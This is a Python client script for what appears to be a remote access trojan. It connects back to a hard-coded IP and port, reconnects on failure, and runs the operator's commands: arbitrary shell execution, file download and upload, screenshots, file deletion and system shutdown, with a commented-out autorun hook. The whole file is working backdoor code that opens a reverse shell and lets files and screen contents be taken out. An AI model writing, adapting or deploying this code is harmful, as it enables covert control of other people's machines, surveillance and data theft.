# import modules
from socket import socket, AF_INET, SOCK_STREAM, error
from time import sleep
from os import path as pth
from sources import *
from file import Recv, Send, ScreenShot

class Connection:
    def __init__(self):
        # self.autorun()
        # Variables
        self.power_list = ["shutdown", "logout", "restart", "reboot"]
        self.send_only = ("explorer", "explorer.", "winver", "msconfig",
        "regedit", "gpedit", "msinfo32", "services.msc", "diskmgmt.msc",
        "shutdown", "logout", "restart", "reboot")
        self.error_tuple = ("cd.", "", "services", "diskmgmt", "cd", "cd...", "cd....")
        self.IPAddr = "192.168.1.4"
        self.Port = 3333
        self.encoding = "utf-8"
        self.size = 102400
        # Create Connection
        self.create_connection()
        self.connect_with_server()
        self.server()
        
    # Defines
    def create_connection(self):
            self.client = socket(AF_INET, SOCK_STREAM)

    def connect_with_server(self):
            while True:
                try:
                    self.client.connect((self.IPAddr, self.Port))
                    print("Device is Connected")
                    break
                except error as err:
                    print(err)
                    sleep(5)

    def server(self):
        while True:
            try:
                self.read()
                print("{}".format(self.command))
                self.clean_command = self.command.replace(" ", "").lower()
                if self.clean_command == "list-part":
                    partition_list = []
                    for p in range(65, 91):
                        p = "{}://".format(chr(p))
                        if pth.exists(p):
                            partition_list.append(p)
                    self.send(str(partition_list))
                elif self.clean_command == "pwd":
                    PWD(self.client)
                elif self.command[:3] == "cd " and self.clean_command[-1] == ":":
                    Cd(self.command)
                elif int(len(self.clean_command)) == 2 and self.clean_command[-1] == ":":
                    Cd(self.clean_command)
                elif self.clean_command == "cd..":
                    Cd(self.clean_command)
                elif self.clean_command in self.power_list:
                    Power(self.clean_command)
                elif self.clean_command in self.send_only:
                    Put(self.clean_command)
                elif self.clean_command == "ls":
                    Popen(self.client, "dir")
                elif self.clean_command[:4] == "cd.>":
                    Put(self.command)
                elif self.clean_command[:6] == "rename":
                    Put(self.command)
                elif self.clean_command[:3] == "del":
                    Put(self.command) 
                elif self.clean_command[:5] == "mkdir":
                    Put(self.command)
                elif self.clean_command[:2] == "md":
                    Put(self.command)
                elif self.clean_command[:5] == "rmdir":
                    Put(self.command)
                elif self.command[:3] == "cd ":
                    Cd(self.command)
                elif self.clean_command[:8] == "explorer":
                    Explorer(self.clean_command)
                elif self.clean_command[:4] == "call": 
                    Open(self.command)
                elif self.clean_command[:4] == "open": 
                    Open(self.command)
                elif self.clean_command[:5] == "start": 
                    Open(self.command)
                elif self.clean_command[:4] == "echo":
                    Put(self.command)
                elif self.clean_command[:6] == "attrib":
                    Put(self.command)
                elif self.command[:9] == "download ":
                    sent_filename = self.command[9:]
                    if pth.exists(f"{sent_filename}"):
                        try:
                            Send(self.client, sent_filename)
                        except:
                            continue
                    else:
                        continue
                elif self.command[:7] == "upload ":
                    try:
                        Recv(self.client, self.clean_command[6:], 1024000)
                    except:
                        continue
                elif self.clean_command == "screenshot":
                    ScreenShot(self.client)
                else: 
                    Popen(self.client, self.command)
            except error as err:
                    print("Device is Not Connected")
                    print(err)
                    while True:
                        try:
                            self.client.close()
                            self.create_connection()
                            self.connect_with_server()
                            break
                        except:
                            print(err)
                            sleep(5)

    def send(self, msg: str):
        self.client.send(msg.encode())

    def read(self):
        self.command = self.client.recv(2048).decode()

Connection()
